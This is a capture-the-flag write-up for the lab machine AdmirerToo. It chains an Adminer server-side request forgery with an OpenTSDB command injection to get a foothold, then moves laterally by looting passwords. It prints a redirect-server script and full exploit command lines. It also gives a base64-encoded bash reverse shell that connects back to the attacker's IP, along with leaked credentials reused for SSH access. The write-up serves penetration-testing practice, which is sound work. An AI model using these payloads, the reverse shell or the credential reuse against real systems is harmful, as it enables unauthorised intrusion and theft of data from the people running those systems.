# AdmirerToo Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.137 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.137`.

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp    open     http    Apache httpd 2.4.38 ((Debian))
|_http-title: Admirer
|_http-server-header: Apache/2.4.38 (Debian)
16010/tcp filtered unknown
16030/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Scan for UDP services with `sudo nmap -p- -sU -r -T5 10.10.11.137 -v` (`-r` specifies that ports will be scanned sequentially instead of randomly. we do this because services are more likely to be running on ports 1-1000.). This finds nothing.

### Apache (Port `80`)

Let's brute force directories with `ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.11.137/FUZZ`:

```
.htaccess               [Status: 403, Size: 328, Words: 21, Lines: 10]
.htpasswd               [Status: 403, Size: 328, Words: 21, Lines: 10]
css                     [Status: 301, Size: 361, Words: 21, Lines: 10]
fonts                   [Status: 301, Size: 363, Words: 21, Lines: 10]
img                     [Status: 301, Size: 361, Words: 21, Lines: 10]
js                      [Status: 301, Size: 360, Words: 21, Lines: 10]
manual                  [Status: 301, Size: 364, Words: 21, Lines: 10]
```

Nothing interesting is found.

Going to a nonexistent page, like `http://10.10.11.137/testing`, shows a generic 404 page but with an email address in a `mailto` link: `webmaster@admirer-gallery.htb`.

Let's add that domain to `/etc/hosts`: `echo "10.10.11.137 admirer-gallery.htb" | sudo tee -a /etc/hosts`.

### Virtual Host Scanning

Now that we know the domain name, we can scan for other virtual hosts. Let's scan for subdomains with `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://admirer-gallery.htb/ -H "Host: FUZZ.admirer-gallery.htb" -fs 14099`:

```
db                      [Status: 200, Size: 2569, Words: 113, Lines: 63]
```

Let's add the new `db` subdomain to `/etc/hosts`: `echo "10.10.11.137 db.admirer-gallery.htb" | sudo tee -a /etc/hosts`.

### Adminer

Navigating to `http://db.admirer-gallery.htb` shows that it is running [Adminer](https://www.adminer.org/) version 4.7.8. Adminer "is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server."

Clicking on the "Login" button brings us to a database management page. Looking at the network tab in developer tools we can see that a post request was made when clicking the button with the below data:

```
auth[driver]: "server"
auth[server]: "localhost"
auth[username]: "admirer_ro"
auth[password]: "1w4nn4b3adm1r3d2!"
auth[db]: "admirer"
auth[permanent]: "1"
```

So, we have database credentials, but trying them in various places does not do anything.

Searching for "adminer 4.7.8 exploit" online finds [CVE-2021-21311](https://nvd.nist.gov/vuln/detail/CVE-2021-21311): "Adminer is an open-source database management in a single PHP file. In adminer from version 4.0.0 and before 4.7.9 there is a server-side request forgery vulnerability. Users of Adminer versions bundling all drivers (e.g. `adminer.php`) are affected. This is fixed in version 4.7.9." Here is a [great article by PortSwigger about SSRF exploits](https://portswigger.net/web-security/ssrf).

Looking around at the relevant links for `CVE-2021-21311`, we find [this pdf](https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf) describing how to exploit the vulnerability.

Essentially, we can modify the login request that was sent such that `driver` is set to "elasticsearch" and `server` is set to a server running on our machine that returns a `301` redirect to a website we want to access. This can be an internal website running locally, which will hopefully contain sensitive information.

Let's test the vulnerability by starting a webserver on our machine with `python3 -m http.server 80`. Then, we can intercept the login request using BurpSuite and change it to look like so: `auth%5Bdriver%5D=elastic&auth%5Bserver%5D=10.10.14.169&auth%5Busername%5D=admirer_ro&auth%5Bpassword%5D=1w4nn4b3adm1r3d2%21&auth%5Bdb%5D=admirer&auth%5Bpermanent%5D=1`. We changed the `driver` to `elastic` and the `server` to our `tun0` ip address. Forwarding the request in BurpSuite produces the following in our http server logs: `10.10.11.137 - - [27/Feb/2022 16:54:22] "GET / HTTP/1.0" 200 -`, which means the application is visiting our page. Now, we can use the [script included in the poc pdf](https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd) to start a basic server that `301` redirects where we want:

```python
#!/usr/bin/env python

import SimpleHTTPServer
import SocketServer
import sys
import argparse

def redirect_handler_factory(url):
    """
    Returns a request handler class that redirects to supplied `url`
    """
    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

       def do_POST(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

    return RedirectHandler


def main():

    parser = argparse.ArgumentParser(description='HTTP redirect server')

    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
    parser.add_argument('redirect_url', action="store")

    myargs = parser.parse_args()

    redirect_url = myargs.redirect_url
    port = myargs.port
    host = myargs.ip

    redirectHandler = redirect_handler_factory(redirect_url)

    handler = SocketServer.TCPServer((host, port), redirectHandler)
    print("serving at port %s" % port)
    handler.serve_forever()

if __name__ == "__main__":
    main()
```

We start the redirect server with `python2 redirect.py --ip 10.10.14.169 http://localhost`. Now, intercepting the login request in BurpSuite and changing it the same as what we did previously, the login page displays a red error box with the source code for the service running on port 80.

Searching for the vulnerability on GitHub finds [llhala/CVE-2021-21311](https://github.com/llhala/CVE-2021-21311), which is an all-in-one script that will automatically parse the login page and pull out the retrieved source code.

We cannot bruteforce ports because after failing to "sign in" too many times we get this message "Too many unsuccessful logins, try again in 21 minutes."

Apparently, we were supposed to find port `4242` as filtered in our `nmap` report. So, let's try that.

We can run the [llhala/CVE-2021-21311](https://github.com/llhala/CVE-2021-21311) exploit script with `python3 CVE-2021-21311.py --host 10.10.14.169 --url http://db.admirer-gallery.htb --redirect http://127.0.0.1:4242`, which returns the following:

```
<!DOCTYPE html><html><head><meta http-equiv=content-type content="text/html;charset=utf-8"><title>OpenTSDB</title>
<style><!--
body{font-family:arial,sans-serif;margin-left:2em}A.l:link{color:#6f6f6f}A.u:link{color:green}.fwf{font-family:monospace;white-space:pre-wrap}//--></style><script type=text/javascript language=javascript src=s/queryui.nocache.js></script></head>
<body text=#000000 bgcolor=#ffffff><table border=0 cellpadding=2 cellspacing=0 width=100%><tr><td rowspan=3 width=1% nowrap><img src=s/opentsdb_header.jpg><td>&nbsp;</td></tr><tr><td><font color=#507e9b><b></b></td></tr><tr><td>&nbsp;</td></tr></table><div id=queryuimain></div><noscript>You must have JavaScript enabled.</noscript><iframe src=javascript:'' id=__gwt_historyFrame tabIndex=-1 style=position:absolute;width:0;height:0;border:0></iframe><table width=100% cellpadding=0 cellspacing=0><tr><td class=subg><img alt="" width=1 height=6></td></tr></table></body></html>
```

### OpenTSDB (`localhost:4242`)

According to the [OpenTSDB/opentsdb GitHub repo](https://github.com/OpenTSDB/opentsdb), "OpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase.  OpenTSDB was written to address a common need: store, index and serve metrics collected from computer systems (network gear, operating systems, applications) at a large scale, and make this data easily accessible and graphable."

Searching for "opentsdb get version" finds [documentation for the `/api/version`](http://opentsdb.net/docs/build/html/api_http/version.html) endpoint. Let's get that endpoint using the Adminer exploit script by running `python3 CVE-2021-21311.py --host 10.10.14.169 --url http://db.admirer-gallery.htb --redirect http://127.0.0.1:4242/api/version`:

```
{"short_revision":"14ab3ef","repo":"/home/hobbes/OFFICIAL/build","host":"clhbase","version":"2.4.0","full_revision":"14ab3ef8a865816cf920aa69f2e019b7261a7847","repo_status":"MINT","user":"hobbes","branch":"master","timestamp":"1545014415"}
```

According to the [releases page](https://github.com/OpenTSDB/opentsdb/releases), v2.4.1 is the latest version. In the changelog we see "Fix for [CVE-2020-35476](https://github.com/advisories/GHSA-hv53-q76c-7f8c) that now validates and limits the inputs for Gnuplot query parameters to prevent remote code execution." This leads us to [this GitHub issue](https://github.com/OpenTSDB/opentsdb/issues/2051) ([relevant GitHub advisory](https://github.com/advisories/GHSA-hv53-q76c-7f8c)), which has a poc: `http://opentsdbhost.local/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json`.

### Foothoold (Adminer + OpenTSDB)

So, we should be able to run arbitrary commands by chaining this exploit together with our Adminer exploit. Let's try simply running the poc with `python3 CVE-2021-21311.py --host 10.10.14.169 --url http://db.admirer-gallery.htb --redirect "http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"`.

This produces the following (we replaced the `\n` with newlines.):

```
{"err":"java.lang.RuntimeException: Unexpected exception
\tat net.opentsdb.core.TSQuery.buildQueries(TSQuery.java:224) ~[tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.tsd.GraphHandler.doGraph(GraphHandler.java:172) ~[tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.tsd.GraphHandler.execute(GraphHandler.java:123) ~[tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.tsd.RpcHandler.handleHttpQuery(RpcHandler.java:282) [tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.tsd.RpcHandler.messageReceived(RpcHandler.java:133) [tsdb-2.4.0.jar:14ab3ef]
\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.timeout.IdleStateAwareChannelUpstreamHandler.handleUpstream(IdleStateAwareChannelUpstreamHandler.java:36) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.timeout.IdleStateHandler.messageReceived(IdleStateHandler.java:294) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.codec.http.HttpContentEncoder.messageReceived(HttpContentEncoder.java:82) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelHandler.handleUpstream(SimpleChannelHandler.java:88) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.codec.http.HttpContentDecoder.messageReceived(HttpContentDecoder.java:108) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.codec.http.HttpChunkAggregator.messageReceived(HttpChunkAggregator.java:145) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:296) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:459) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.codec.replay.ReplayingDecoder.callDecode(ReplayingDecoder.java:536) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.codec.replay.ReplayingDecoder.messageReceived(ReplayingDecoder.java:435) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:296) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelHandler.messageReceived(SimpleChannelHandler.java:142) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelHandler.handleUpstream(SimpleChannelHandler.java:88) [netty-3.10.6.Final.jar:na]
\tat net.opentsdb.tsd.ConnectionManager.handleUpstream(ConnectionManager.java:128) [tsdb-2.4.0.jar:14ab3ef]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:268) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:255) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:337) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42) [netty-3.10.6.Final.jar:na]
\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_292]
\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_292]
\tat java.lang.Thread.run(Thread.java:748) [na:1.8.0_292]
Caused by: com.stumbleupon.async.DeferredGroupException: At least one of the Deferreds failed, first exception:
\tat com.stumbleupon.async.DeferredGroup.done(DeferredGroup.java:169) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.DeferredGroup.recordCompletion(DeferredGroup.java:142) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.DeferredGroup.access$000(DeferredGroup.java:36) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.DeferredGroup$1Notify.call(DeferredGroup.java:82) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred.doCall(Deferred.java:1278) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred.runCallbacks(Deferred.java:1257) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred.access$300(Deferred.java:430) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred$Continue.call(Deferred.java:1366) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred.doCall(Deferred.java:1278) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred.runCallbacks(Deferred.java:1257) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred.access$300(Deferred.java:430) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred$Continue.call(Deferred.java:1366) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred.doCall(Deferred.java:1278) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred.runCallbacks(Deferred.java:1257) ~[async-1.4.0.jar:na]
\tat com.stumbleupon.async.Deferred.callback(Deferred.java:1005) ~[async-1.4.0.jar:na]
\tat org.hbase.async.HBaseRpc.callback(HBaseRpc.java:720) ~[asynchbase-1.8.2.jar:na]
\tat org.hbase.async.RegionClient.decode(RegionClient.java:1575) ~[asynchbase-1.8.2.jar:na]
\tat org.hbase.async.RegionClient.decode(RegionClient.java:88) ~[asynchbase-1.8.2.jar:na]
\tat org.jboss.netty.handler.codec.replay.ReplayingDecoder.callDecode(ReplayingDecoder.java:500) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.codec.replay.ReplayingDecoder.messageReceived(ReplayingDecoder.java:435) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]
\tat org.hbase.async.RegionClient.handleUpstream(RegionClient.java:1230) ~[asynchbase-1.8.2.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelHandler.messageReceived(SimpleChannelHandler.java:142) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelHandler.handleUpstream(SimpleChannelHandler.java:88) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.timeout.IdleStateAwareChannelHandler.handleUpstream(IdleStateAwareChannelHandler.java:36) ~[netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.handler.timeout.IdleStateHandler.messageReceived(IdleStateHandler.java:294) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) [netty-3.10.6.Final.jar:na]
\tat org.jboss.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559) [netty-3.10.6.Final.jar:na]
\tat org.hbase.async.HBaseClient$RegionClientPipeline.sendUpstream(HBaseClient.java:3857) ~[asynchbase-1.8.2.jar:na]
\t... 12 common frames omitted
Caused by: net.opentsdb.uid.NoSuchUniqueName: No such name for 'metrics': 'sys.cpu.nice'
\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:450) ~[tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:447) ~[tsdb-2.4.0.jar:14ab3ef]
\t... 42 common frames omitted
"}
```

This is a stacktrace. Most of it doesn't even pertain to OpenTSDB. Filtering the lines that have "opentsdb" in them we get:

```
\tat net.opentsdb.core.TSQuery.buildQueries(TSQuery.java:224) ~[tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.tsd.GraphHandler.doGraph(GraphHandler.java:172) ~[tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.tsd.GraphHandler.execute(GraphHandler.java:123) ~[tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.tsd.RpcHandler.handleHttpQuery(RpcHandler.java:282) [tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.tsd.RpcHandler.messageReceived(RpcHandler.java:133) [tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.tsd.ConnectionManager.handleUpstream(ConnectionManager.java:128) [tsdb-2.4.0.jar:14ab3ef]
Caused by: net.opentsdb.uid.NoSuchUniqueName: No such name for 'metrics': 'sys.cpu.nice'
\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:450) ~[tsdb-2.4.0.jar:14ab3ef]
\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:447) ~[tsdb-2.4.0.jar:14ab3ef]
```

So, it looks like the issue is `No such name for 'metrics': 'sys.cpu.nice'`. Searching "opentsdb metrics list" online finds [this page of the OpenTSDB documentation](http://opentsdb.net/docs/build/html/user_guide/query/examples.html) that gives some query examples. Let's try the `sys.cpu.system` metric listed. Let's run our modified exploit: 

```
python3 CVE-2021-21311.py --host 10.10.14.169 --url http://db.admirer-gallery.htb --redirect "http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.system&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
```

This produces the same error.

Let's see if we can list the available metrics. Searching "opentsdb list all metrics" finds [this StackOverflow answer](https://stackoverflow.com/a/18437210), which links to the [documentation for the `/api/suggest` endpoint](http://opentsdb.net/docs/build/html/api_http/suggest.html). Let's run our Adminer exploit again but this time we'll get the `/api/suggest?type=metrics` endpoint: `python3 CVE-2021-21311.py --host 10.10.14.169 --url http://db.admirer-gallery.htb --redirect "http://127.0.0.1:4242/api/suggest?type=metrics"`. This produces: `["http.stats.web.hits"]`. So, we can use the `http.stats.web.hits` endpoint.

Now, our chained exploit is:

```
python3 CVE-2021-21311.py --host 10.10.14.169 --url http://db.admirer-gallery.htb --redirect "http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
```

Running this produces `{"plotted":4,"timing":231,"etags":[["host"]],"points":8}`, which means it probably worked!

Now, let's put in a reverse shell instead. We will use the `bash -i >& /dev/tcp/10.10.14.169/28471 0>&1` reverse shell. We base64 encode it to get rid of illegal character so our reverse shell is now: `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjkvMjg0NzEgMD4mMQ== | base64 -d | bash`. We will also url-encode our payload with [urlencoder.org](https://www.urlencoder.org/) to get: `echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNjkvMjg0NzEgMD4mMQ%3D%3D%20%7C%20base64%20-d%20%7C%20bash`. We start a listener with `pwncat-cs -lp 28471`. Then, we run the exploit:

```
python3 CVE-2021-21311.py --host 10.10.14.169 --url http://db.admirer-gallery.htb --redirect "http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNjkvMjg0NzEgMD4mMQ%3D%3D%20%7C%20base64%20-d%20%7C%20bash')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
```

This spawns a reverse shell as the `opentsdb` user!

## Lateral Movement

Looking at `jennifer`'s home directory with `ls -la /home/jennifer/` shows that it contains the `user.txt` flag. So, we need to gain access to the `jennifer` user.

Looking at `/etc/passwd`, `opentsdb` does not have a shell: `opentsdb:x:1000:1000::/usr/share/opentsdb:/bin/false`. So, we cannot easily gain persistance.

Uploading and running LinPEAS, we find various passwords:

```
╔══════════╣ Searching passwords in config PHP files
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'cats_dev');
define('DATABASE_PASS', 'adm1r3r0fc4ts');
define('DATABASE_USER', 'cats');
define('DEMO_PASSWORD',  'john99');
define('FORGOT_PASSWORD_FROM_NAME', 'CATS');
define('FORGOT_PASSWORD_SUBJECT',   'CATS - Password Retrieval Request');
define ('LDAP_BIND_PASSWORD', 'password');
define('MAIL_SMTP_USER', "user");
define('TESTER_PASSWORD',  'john99');
define('TESTER_USER_ID',   4);
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'cats');
define('DATABASE_PASS', 'yourpass');
define('DATABASE_USER', 'cats');
define('DEMO_PASSWORD',  'john99');
define('FORGOT_PASSWORD_FROM_NAME', 'OpenCATS');
define('FORGOT_PASSWORD_SUBJECT',   'OpenCATS - Password Retrieval Request');
define('MAIL_SMTP_USER', "user");
define('TESTER_PASSWORD',  'john99');
define('TESTER_USER_ID',   4);
define('DATABASE_HOST', 'opencatsdb');
define('DATABASE_NAME', 'cats_test');
define('DATABASE_PASS', 'dev');
define('DATABASE_USER', 'dev');
define('DEMO_PASSWORD',  'john99');
define('FORGOT_PASSWORD_FROM_NAME', 'CATS');
define('FORGOT_PASSWORD_SUBJECT',   'CATS - Password Retrieval Request');
define ('LDAP_BIND_PASSWORD', 'password');
define('MAIL_SMTP_USER', "user");
define('TESTER_PASSWORD',  'john99');
define('TESTER_USER_ID',   4);
```

Running `grep -r 'pass' /var/www/adminer/` (since that is one of the services that we exploited) displays some commented out credentials in `/var/www/adminer/plugins/data/servers.php`:

```
<?php
return [
  'localhost' => array(
//    'username' => 'admirer',
//    'pass'     => 'bQ3u7^AxzcB7qAsxE3',
// Read-only account for testing
    'username' => 'admirer_ro',
    'pass'     => '1w4nn4b3adm1r3d2!',
    'label'    => 'MySQL',
    'databases' => array(
      'admirer' => 'Admirer DB',
    )
  ),
];
```

Trying the `bQ3u7^AxzcB7qAsxE3` password when connecting via SSH (`ssh jennifer@admirer-gallery.htb`) as the `jennifer` user is successful.

## Privilege Escalation

We sign in as the `jennifer` user with `ssh jennifer@admirer-gallery.htb` (password `bQ3u7^AxzcB7qAsxE3`). We can now get the `user.txt` flag with `cat /home/jennifer/user.txt`.

Running LinPEAS and looking through the output we see references to `/opt/opencats`. Additionally in the LinPEAS "Active Ports" section we see port `8080`.

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::16010                :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
tcp6       0      0 127.0.1.1:16020         :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::16030                :::*                    LISTEN      -
tcp6       0      0 127.0.1.1:16000         :::*                    LISTEN      -
tcp6       0      0 127.0.0.1:2181          :::*                    LISTEN      -
```

Running `curl 127.0.0.1:8080` reveals an OpenCATS page.

### OpenCATS

"OpenCATS is a Free and Open Source Candidate/Applicant Tracking System designed for Recruiters to manage recruiting process from job posting, candidate application, through to candidate selection and submission." - [GitHub Repo: opencats/OpenCATS](https://github.com/opencats/OpenCATS). Here is the [OpenCATS documentation](https://opencats-documentation.readthedocs.io/en/latest/).

We can port forward the OpenCATS port `8080` to our attacker machine with `ssh -L 8080:localhost:8080 jennifer@admirer-gallery.htb`.

